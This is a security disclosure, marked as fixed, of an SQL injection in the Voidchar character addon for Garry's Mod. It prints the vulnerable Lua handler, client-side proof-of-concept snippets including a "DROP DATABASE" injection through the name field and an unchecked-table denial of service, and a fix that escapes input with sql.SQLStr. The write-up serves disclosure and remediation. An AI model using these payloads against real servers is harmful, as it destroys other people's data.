# Voidchar SQL Injection
Found by OverlordAkise on 2021.05.08  

**_This exploit has been fixed._**

Addon can be purchased at [https://www.gmodstore.com/market/view/voidchar-character-system-1](https://www.gmodstore.com/market/view/voidchar-character-system-1)  

Voidchar has a possible SQL Injection in the ChangeIdentity net.Receive function.

### TL;DR
Voidchar neither sanitizes player input before inserting into the database nor check the rp-name for special characters.  
This allows players to use an SQL Injection on the `VoidChar.ChangeIdentity` network channel via a malformed `name` variable from `net.ReadString`.  

### The Code
This is the Code that is responsible for the SQL Injection.
```LUA 
function Ply.ChangeIdentity(len, ply)
	if not ply:GetCharacterID() then return end


	local name = net.ReadString()
	local model = net.ReadString()
	local bodygroups = net.ReadTable()

	if !ply:canAfford(VoidChar.Config.IdentityChangeCost) then
		DarkRP.notify(ply, 1, 5, phrase("cant_afford"))
		return
	end

	if #name > VoidChar.Config.MaxNameLength then
		DarkRP.notify(ply, 1, 5, string.format(phrase("name_long"), VoidChar.Config.MaxNameLength) )
		return
	end

	if #name < VoidChar.Config.MinNameLength then
		DarkRP.notify(ply, 1, 5, string.format(phrase("name_short"), VoidChar.Config.MinNameLength))
		return
	end

	local plyJob = RPExtraTeams[ply:Team()]

	if (( type(plyJob.model) == "table" and !table.HasValue(plyJob.model, model) ) or ( type(plyJob.model) == "string" and plyJob.model != model )) then
		return
	end

	local nameWords = string.Explode(" ", name)
	if VoidChar.Config.ForceTwoNames and ((VoidChar.Config.RestrictThreeNames and #nameWords ~= 3) or #nameWords > 3 or #nameWords < 2) then
		local maxWords = 2
		if !VoidChar.Config.RestrictThreeNames then
			maxWords = 3
		end
		DarkRP.notify(ply, 1, 5, string.format(phrase("too_many_words"), maxWords) )
		return
	end

	if Ply.Data[ply].character.clone_id != "NULL" and Ply.Data[ply].character.clone_id != false and VoidChar.Config.EnableCloneID then
		local hashtag = (VoidChar.Config.ShowHashtag and "#") or ""

		if VoidChar.Config.DisplayAsSuffix then
			ply:setDarkRPVar("rpname", hashtag .. Ply.Data[ply].character.clone_id.. " " .. Ply.Data[ply].character.name)
		else
			ply:setDarkRPVar("rpname", Ply.Data[ply].character.name.. " " .. hashtag .. Ply.Data[ply].character.clone_id)
		end
	else
		ply:setDarkRPVar("rpname", name)
	end

	Ply.Data[ply].character.name = name
	Ply.Data[ply].character.model = model

	VoidChar.SQL.UpdateValue(ply:GetCharacterID(), "name", "\'".. name .. "\'")
	VoidChar.SQL.UpdateValue(ply:GetCharacterID(), "model", "\'".. model .. "\'")

	if (VoidChar.Config.BodygroupOption and VoidChar.Config.BodygroupChangeInNPCs) then
		if (bodygroups) then
			for k, v in pairs(bodygroups) do
				ply:SetBodygroup(k,v)
			end
		end

		local bodygroupsJSON = util.TableToJSON(bodygroups)
		

		Ply.Data[ply].character.bodygroups = bodygroupsJSON
		VoidChar.SQL.UpdateValue(ply:GetCharacterID(), "bodygroups", "\'".. bodygroupsJSON .. "\'")
	end

	ply:SetModel(model)

	local characters = ply:GetCharacters()

	characters = util.TableToJSON(characters)
	characters = util.Compress(characters)

	net.Start("VoidChar.RequestCharacters")
		net.WriteUInt(#characters, 32)
		net.WriteData(characters, #characters)
		net.WriteBool(false)
	net.Send(ply)

	ply:addMoney(-VoidChar.Config.IdentityChangeCost)

	DarkRP.notify(ply, 0, 5, phrase("success_identity"))

end net.Receive("VoidChar.ChangeIdentity", Ply.ChangeIdentity)
```

### The Problem
The name, model and bodygroups are all things the player sends.  
But there are 0 checks if there are special characters in them.  

The model can't be used for an attack as it's effectively checked against the possible models.  
The Bodygroup can't be used either, as it would throw errors which blocks the code from advancing to the sql-save method.  
The name however is perfect for SQL Injections. It only checks for the length, nothing more. You can even set special characters as RP-Name, which is normally not possible with default DarkRP.  

This would - by itself - not be a problem, because the Name has a max value by default with 25 characters. This is too short for any big SQL Injection, except `DROP DATABASE`. But if you raise this MaxNameLength limit then players can do all sorts of SQL Injections.  

The biggest problem is this specific line: `VoidChar.SQL.UpdateValue(ply:GetCharacterID(), "name", "\'".. name .. "\'")`  
The creator of the addon doesn't escape the player input correctly.

### Example Code
The following example sets your name to heart-characters, which proves the point of this exploit:
```LUA
net.Start("VoidChar.ChangeIdentity")
  net.WriteString("♥♥♥♥♥")
  net.WriteString(LocalPlayer():GetModel())
  net.WriteTable({})
net.SendToServer()
```  
Another variant would be the forementioned SQL Injection:
```LUA
net.Start("VoidChar.ChangeIdentity")
  net.WriteString("');DROP DATABASE;--")
  net.WriteString(LocalPlayer():GetModel())
  net.WriteTable({})
net.SendToServer()
```  
Warning: This sets your name to the injected string aswell.  

Another variant would be a Denial of Service through huge Bodygroupr tables, as they don't get checked:
```LUA
net.Start("VoidChar.ChangeIdentity")
  net.WriteString("Peter Hustensaft")
  net.WriteString(LocalPlayer():GetModel())
  net.WriteTable({[1] = 1, [2] = 2, [3] = 3, [4] = 4, [5] = 5})
net.SendToServer()
```  


### Fixing the exploit
The easiest fix would be: Correctly escape player input.  
Instead of `'..name..'` the database code should be `..sql.SQLStr(name)..`. This would make SQL Injections impossible.  
This would make this
```LUA
VoidChar.SQL.UpdateValue(ply:GetCharacterID(), "name", "\'".. name .. "\'")
```  
to this
```LUA
VoidChar.SQL.UpdateValue(ply:GetCharacterID(), "name", sql.SQLStr(name))
```  
and now no more exploits are possible.
